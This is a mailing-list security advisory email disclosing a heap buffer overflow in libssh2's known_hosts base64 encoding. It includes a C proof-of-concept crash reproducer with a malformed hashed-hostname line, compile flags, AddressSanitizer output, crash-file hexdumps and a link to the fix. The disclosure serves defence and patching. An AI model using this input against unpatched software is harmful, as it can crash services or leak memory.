Received: (qmail 13943 invoked by uid 550); 26 Aug 2025 18:05:31 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 26028 invoked from network); 26 Aug 2025 17:56:28 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1756230978; x=1756835778; darn=lists.openwall.com;
        h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=1EArP3JeW/1/rDaHYnde7zfoo0I21AdxzzEycRPzxgA=;
        b=ZY533RRIr4TYuw4IUEJClqH7+C0TTBepabBlbbbGph9jkaFqWa12ReuJR2jA+XzgXo
         +TnyJz2B7jHOTUWw7KpCJFDEV9iVCbbcKVpy7DmjQC65o5VUV71LMTOSgsJL77Q7kDcD
         duQM/HnXftlH5DKXXffVMsjK81pAE9hWZkvE2EowSDfSbKYpkggSncu+3fS+JUSqpSUL
         ps47ty7k9rwbZzjUMoXSMk46/a5Wv3PArZge7UjurXNOpBlVjYfHPAdKZS9Nmv90l9YD
         YGGsk0whw3iU7l6hOSU/N/HRxHCxS8ad4y7A/gzsfUjp8QE/Q4YLfrkI6TN50SEljmWY
         Dgfw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1756230978; x=1756835778;
        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=1EArP3JeW/1/rDaHYnde7zfoo0I21AdxzzEycRPzxgA=;
        b=usRX0EEwPbyJ2+RWSJekhPhouWyeCl4xeZbOIXUOEWY02vlWegs6o9AsVWvtr70EKn
         xkoA19+2b+T/YProFLUnK7kw4nLszjr+bRg4sFWiTCSAz5HjQC09xrVt+UZTLPofMd1C
         cZ5vbJivG9tuD0hIWc0Vvy1FYgW9HvRzemc4TUkvNBkFewVwyk7tzuT9AhHPtTwMqGrX
         GKw9jerFDYG8xxxGi+oTI35meoGs0g3o1v3I4RidDpB66eDR09jRvYcKN8mi9sBy1X52
         563fbjjot5SCokcL1V4VwucxthYDF3jwsj2gje6gS0QLYk5NKOGs6oY51wh9yPkEO0P/
         1dLA==
X-Gm-Message-State: AOJu0YwpP2K84YoWMQmhCg5RJiH/fJRpL4MjEgQrJCx3q6KFPGtULkDx
	Zp6eOQiwrC+3uL5WpbkffD41cPHrM/vK5KXnvseZQbCSIj/DU9UKWkjboCn5bQzriyHt0H1EI1S
	xJxdShgyQ/3GpTLpr/+orw2wBFKvncku1vRy1
X-Gm-Gg: ASbGncs92kncbFv8xifCFpDXTxyzuusulUMZjzXn7mfBCdsQHhHtDYGta2qvhS37Iko
	QRVpLzWUUsyr0Bxb0JrSC0RFHfN6gP1F/zwh4auyubxY3tBKFQldZ/JoiTMHW7pQkyteaokvgN8
	GgjONAg+4lc486iRXxpPGYVpFhJ4VA5HUqF8yC0OSSpTdCcGPklpIhvG3FHE2H+U0O0adtVcu22
	mE+Gw==
X-Google-Smtp-Source: AGHT+IEXQX5oYJxZf3gWhl64nx9o+V64RYLlt0ChCJq9k9yBkk0MARVwn3T803KcBligMZMp1xEKVhgyCzwSiFScdtw=
X-Received: by 2002:a17:907:940d:b0:ae3:a78d:a08a with SMTP id
 a640c23a62f3a-afe28ec4312mr1375678466b.6.1756230978133; Tue, 26 Aug 2025
 10:56:18 -0700 (PDT)
MIME-Version: 1.0
From: Dhiraj Mishra <mishra.dhiraj95@gmail.com>
Date: Tue, 26 Aug 2025 21:56:06 +0400
X-Gm-Features: Ac12FXxmJh1LxeiflVCu1QVJKCzIlDUhxIx_-KS85ptiXdXko5jHZWOjxuI79co
Message-ID: <CAG8b5tQyFKNedYpJ_tNzRROuJy5yJfewqOAqjQ9_zNfMiK5dFg@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="000000000000986488063d486398"
Subject: [oss-security] libssh2 Base64 Encoding Heap Overflow in Known Hosts SHA1 Hash Processing

--000000000000986488063d486398
Content-Type: text/plain; charset="UTF-8"

*Summary:*

I've successfully created a libFuzzer harness targeting the
libssh2_knownhost_readline() API, used for parsing SSH known_hosts files.
The fuzzer discovered a heap buffer overflow vulnerability in the
_libssh2_base64_encode() function when processing malformed hashed hostname
entries.

*minimal_poc.c:*

#include <stdio.h>
#include <string.h>
#include "libssh2.h"

int main() {

    const char *evil = "|1|||||||
ssh-h-\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13rsA=
#";

    libssh2_init(0);
    LIBSSH2_SESSION *session = libssh2_session_init();
    LIBSSH2_KNOWNHOSTS *hosts = libssh2_knownhost_init(session);

    libssh2_knownhost_readline(hosts, evil, strlen(evil),
LIBSSH2_KNOWNHOST_FILE_OPENSSH);

    struct libssh2_knownhost *store, *prev = NULL;
    char buf[4096];
    size_t len;
    if (libssh2_knownhost_get(hosts, &store, prev) == 0) {
        libssh2_knownhost_writeline(hosts, store, buf, sizeof(buf), &len,
LIBSSH2_KNOWNHOST_FILE_OPENSSH);
    }

    libssh2_knownhost_free(hosts);
    libssh2_session_free(session);
    libssh2_exit();
    return 0;
}

*Compile:*

clang -g -fsanitize=address -I./include -I./src -DLIBSSH2_OPENSSL
-I/usr/local/opt/openssl@3/include minimal_poc.c ./src/.libs/libssh2.a
-L/usr/local/opt/openssl@3/lib -lcrypto -lssl -lz -o minimal_poc

*ASAN:*

bash-3.2$ ./minimal_poc
minimal_poc(41411,0x7ff84b5d2f80) malloc: nano zone abandoned due to
inability to reserve vm space.
=================================================================
==41411==ERROR: AddressSanitizer: heap-buffer-overflow on address
0x6020000000d5 at pc 0x00010728cb0f bp 0x7ff7b9a37f90 sp 0x7ff7b9a37758
READ of size 6 at 0x6020000000d5 thread T0
    #0 0x00010728cb0e in strlen+0x80e
(libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x19b0e)
    #1 0x0001064d808e in _libssh2_base64_encode misc.c:463
    #2 0x0001064d72d3 in knownhost_writeline knownhost.c:1108
    #3 0x0001064c6b10 in main minimal_poc.c:21
    #4 0x7ff80983352f in start+0xbef (dyld:x86_64+0xfffffffffffde52f)

0x6020000000d5 is located 0 bytes after 5-byte region
[0x6020000000d0,0x6020000000d5)
allocated by thread T0 here:
    #0 0x0001073554d2 in malloc+0x82
(libclang_rt.asan_osx_dynamic.dylib:x86_64h+0xe24d2)
    #1 0x0001064d7f0c in _libssh2_base64_decode misc.c:395
    #2 0x0001064d606f in knownhost_add knownhost.c:174
    #3 0x0001064d6fa1 in hostline knownhost.c:851
    #4 0x0001064c6aae in main minimal_poc.c:14
    #5 0x7ff80983352f in start+0xbef (dyld:x86_64+0xfffffffffffde52f)

SUMMARY: AddressSanitizer: heap-buffer-overflow misc.c:463 in
_libssh2_base64_encode
Shadow bytes around the buggy address:
  0x601ffffffe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x601ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x601fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x601fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x602000000000: fa fa fd fa fa fa fd fd fa fa 00 00 fa fa 00 04
=>0x602000000080: fa fa 00 04 fa fa 00 00 fa fa[05]fa fa fa 01 fa
  0x602000000100: fa fa 02 fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==41411==ABORTING
Abort trap: 6
bash-3.2$

*Crash:*

bash-3.2$ hexdump -C ./crash-47ae4ab289208f01fa5c170cf038b6b3420136cb
00000000  7c 31 7c 7c 7c 7c 7c 7c  7c 20 73 73 68 2d 68 2d  ||1|||||||
ssh-h-|
00000010  13 13 13 13 13 13 13 13  13 13 13 13 13 13 13 13
 |................|
00000020  13 13 13 13 13 13 13 13  13 13 13 72 73 41 3d 20
 |...........rsA= |
00000030  23                                                |#|
00000031
bash-3.2$
bash-3.2$ hexdump -C crash-d72f40d5cd95987a058ece287de07373ae7e1c23
00000000  7c 31 7c 7c 7c 7c 7c 7c  7c 20 73 73 68 2c 72 73  ||1|||||||
ssh,rs|
00000010  61 20 41 3d 40 ff ff ff  ff ff ff ff ff ff ff ff  |a
A=@...........|
00000020  ff ff ff ff ff ff ff ff  ff ff ff 20 23           |........... #|
0000002d
bash-3.2$

*Fix:*

https://github.com/libssh2/libssh2/pull/1641

--000000000000986488063d486398
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr"><div class=3D"gmail_default"><b><font face=3D"verdana, san=
s-serif">Summary:</font></b></div><div class=3D"gmail_default"><font face=
=3D"tahoma, sans-serif"><b><br></b></font></div><div class=3D"gmail_default=
"><font face=3D"verdana, sans-serif">I&#39;ve successfully created a libFuz=
zer harness targeting the</font><font face=3D"monospace"> libssh2_knownhost=
_readline()</font><font face=3D"verdana, sans-serif"> API, used for parsing=
 SSH known_hosts files. The fuzzer discovered a heap buffer overflow vulner=
ability in the </font><font face=3D"monospace">_libssh2_base64_encode()</fo=
nt><font face=3D"verdana, sans-serif"> function when processing malformed h=
ashed hostname entries.</font><br><br><b><font face=3D"verdana, sans-serif"=
>minimal_poc.c:</font></b><br><br><font face=3D"monospace">#include &lt;std=
io.h&gt;<br>#include &lt;string.h&gt;<br>#include &quot;libssh2.h&quot;<br>=
<br>int main() {<br><br>=C2=A0 =C2=A0 const char *evil =3D &quot;|1||||||| =
ssh-h-\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\=
x13\x13\x13\x13\x13\x13\x13\x13\x13\x13rsA=3D #&quot;;<br>=C2=A0 =C2=A0 <br=
>=C2=A0 =C2=A0 libssh2_init(0);<br>=C2=A0 =C2=A0 LIBSSH2_SESSION *session =
=3D libssh2_session_init();<br>=C2=A0 =C2=A0 LIBSSH2_KNOWNHOSTS *hosts =3D =
libssh2_knownhost_init(session);<br>=C2=A0 =C2=A0 <br>=C2=A0 =C2=A0 libssh2=
_knownhost_readline(hosts, evil, strlen(evil), LIBSSH2_KNOWNHOST_FILE_OPENS=
SH);<br>=C2=A0 =C2=A0 <br>=C2=A0 =C2=A0 struct libssh2_knownhost *store, *p=
rev =3D NULL;<br>=C2=A0 =C2=A0 char buf[4096];<br>=C2=A0 =C2=A0 size_t len;=
<br>=C2=A0 =C2=A0 if (libssh2_knownhost_get(hosts, &amp;store, prev) =3D=3D=
 0) {<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 libssh2_knownhost_writeline(hosts, sto=
re, buf, sizeof(buf), &amp;len, LIBSSH2_KNOWNHOST_FILE_OPENSSH);<br>=C2=A0 =
=C2=A0 }<br>=C2=A0 =C2=A0 <br>=C2=A0 =C2=A0 libssh2_knownhost_free(hosts);<=
br>=C2=A0 =C2=A0 libssh2_session_free(session);<br>=C2=A0 =C2=A0 libssh2_ex=
it();<br>=C2=A0 =C2=A0 return 0;<br>}</font><br><br><b><font face=3D"verdan=
a, sans-serif">Compile:</font></b><br><br><font face=3D"monospace">clang -g=
 -fsanitize=3Daddress -I./include -I./src -DLIBSSH2_OPENSSL -I/usr/local/op=
t/openssl@3/include minimal_poc.c ./src/.libs/libssh2.a -L/usr/local/opt/op=
enssl@3/lib -lcrypto -lssl -lz -o minimal_poc</font><br><br><b><font face=
=3D"verdana, sans-serif">ASAN:</font></b><br><br><font face=3D"monospace">b=
ash-3.2$ ./minimal_poc<br>minimal_poc(41411,0x7ff84b5d2f80) malloc: nano zo=
ne abandoned due to inability to reserve vm space.<br>=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D<br>=3D=3D41411=3D=3DERROR: AddressSanitizer: heap-=
buffer-overflow on address 0x6020000000d5 at pc 0x00010728cb0f bp 0x7ff7b9a=
37f90 sp 0x7ff7b9a37758<br>READ of size 6 at 0x6020000000d5 thread T0<br>=
=C2=A0 =C2=A0 #0 0x00010728cb0e in strlen+0x80e (libclang_rt.asan_osx_dynam=
ic.dylib:x86_64h+0x19b0e)<br>=C2=A0 =C2=A0 #1 0x0001064d808e in _libssh2_ba=
se64_encode misc.c:463<br>=C2=A0 =C2=A0 #2 0x0001064d72d3 in knownhost_writ=
eline knownhost.c:1108<br>=C2=A0 =C2=A0 #3 0x0001064c6b10 in main minimal_p=
oc.c:21<br>=C2=A0 =C2=A0 #4 0x7ff80983352f in start+0xbef (dyld:x86_64+0xff=
fffffffffde52f)<br><br>0x6020000000d5 is located 0 bytes after 5-byte regio=
n [0x6020000000d0,0x6020000000d5)<br>allocated by thread T0 here:<br>=C2=A0=
 =C2=A0 #0 0x0001073554d2 in malloc+0x82 (libclang_rt.asan_osx_dynamic.dyli=
b:x86_64h+0xe24d2)<br>=C2=A0 =C2=A0 #1 0x0001064d7f0c in _libssh2_base64_de=
code misc.c:395<br>=C2=A0 =C2=A0 #2 0x0001064d606f in knownhost_add knownho=
st.c:174<br>=C2=A0 =C2=A0 #3 0x0001064d6fa1 in hostline knownhost.c:851<br>=
=C2=A0 =C2=A0 #4 0x0001064c6aae in main minimal_poc.c:14<br>=C2=A0 =C2=A0 #=
5 0x7ff80983352f in start+0xbef (dyld:x86_64+0xfffffffffffde52f)<br><br>SUM=
MARY: AddressSanitizer: heap-buffer-overflow misc.c:463 in _libssh2_base64_=
encode<br>Shadow bytes around the buggy address:<br>=C2=A0 0x601ffffffe00: =
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>=C2=A0 0x601ffffffe80: 0=
0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>=C2=A0 0x601fffffff00: 00=
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>=C2=A0 0x601fffffff80: 00 =
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>=C2=A0 0x602000000000: fa f=
a fd fa fa fa fd fd fa fa 00 00 fa fa 00 04<br>=3D&gt;0x602000000080: fa fa=
 00 04 fa fa 00 00 fa fa[05]fa fa fa 01 fa<br>=C2=A0 0x602000000100: fa fa =
02 fa fa fa fa fa fa fa fa fa fa fa fa fa<br>=C2=A0 0x602000000180: fa fa f=
a fa fa fa fa fa fa fa fa fa fa fa fa fa<br>=C2=A0 0x602000000200: fa fa fa=
 fa fa fa fa fa fa fa fa fa fa fa fa fa<br>=C2=A0 0x602000000280: fa fa fa =
fa fa fa fa fa fa fa fa fa fa fa fa fa<br>=C2=A0 0x602000000300: fa fa fa f=
a fa fa fa fa fa fa fa fa fa fa fa fa<br>Shadow byte legend (one shadow byt=
e represents 8 application bytes):<br>=C2=A0 Addressable: =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 00<br>=C2=A0 Partially addressable: 01 02 03 04 05 06 07 =
<br>=C2=A0 Heap left redzone: =C2=A0 =C2=A0 =C2=A0 fa<br>=C2=A0 Freed heap =
region: =C2=A0 =C2=A0 =C2=A0 fd<br>=C2=A0 Stack left redzone: =C2=A0 =C2=A0=
 =C2=A0f1<br>=C2=A0 Stack mid redzone: =C2=A0 =C2=A0 =C2=A0 f2<br>=C2=A0 St=
ack right redzone: =C2=A0 =C2=A0 f3<br>=C2=A0 Stack after return: =C2=A0 =
=C2=A0 =C2=A0f5<br>=C2=A0 Stack use after scope: =C2=A0 f8<br>=C2=A0 Global=
 redzone: =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0f9<br>=C2=A0 Global init order:=
 =C2=A0 =C2=A0 =C2=A0 f6<br>=C2=A0 Poisoned by user: =C2=A0 =C2=A0 =C2=A0 =
=C2=A0f7<br>=C2=A0 Container overflow: =C2=A0 =C2=A0 =C2=A0fc<br>=C2=A0 Arr=
ay cookie: =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0ac<br>=C2=A0 Intra obje=
ct redzone: =C2=A0 =C2=A0bb<br>=C2=A0 ASan internal: =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 fe<br>=C2=A0 Left alloca redzone: =C2=A0 =C2=A0 ca<br>=C2=A0 =
Right alloca redzone: =C2=A0 =C2=A0cb<br>=3D=3D41411=3D=3DABORTING<br>Abort=
 trap: 6<br>bash-3.2$</font><br><br><b><font face=3D"verdana, sans-serif">C=
rash:</font></b><br><br><font face=3D"monospace">bash-3.2$ hexdump -C ./cra=
sh-47ae4ab289208f01fa5c170cf038b6b3420136cb <br>00000000 =C2=A07c 31 7c 7c =
7c 7c 7c 7c =C2=A07c 20 73 73 68 2d 68 2d =C2=A0||1||||||| ssh-h-|<br>00000=
010 =C2=A013 13 13 13 13 13 13 13 =C2=A013 13 13 13 13 13 13 13 =C2=A0|....=
............|<br>00000020 =C2=A013 13 13 13 13 13 13 13 =C2=A013 13 13 72 7=
3 41 3d 20 =C2=A0|...........rsA=3D |<br>00000030 =C2=A023 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0|#|<br>00000031<br>bash-3.2$ <br>bash-3.2$ hexdump -C crash-d72f40d5c=
d95987a058ece287de07373ae7e1c23<br>00000000 =C2=A07c 31 7c 7c 7c 7c 7c 7c =
=C2=A07c 20 73 73 68 2c 72 73 =C2=A0||1||||||| ssh,rs|<br>00000010 =C2=A061=
 20 41 3d 40 ff ff ff =C2=A0ff ff ff ff ff ff ff ff =C2=A0|a A=3D@.........=
..|<br>00000020 =C2=A0ff ff ff ff ff ff ff ff =C2=A0ff ff ff 20 23 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 |........... #|<br>0000002d<br>bash-3.2$ </font=
><br><br><b><font face=3D"verdana, sans-serif">Fix:</font></b><br><br><font=
 face=3D"verdana, sans-serif"><a href=3D"https://github.com/libssh2/libssh2=
/pull/1641">https://github.com/libssh2/libssh2/pull/1641</a></font><br></di=
v></div>

--000000000000986488063d486398--
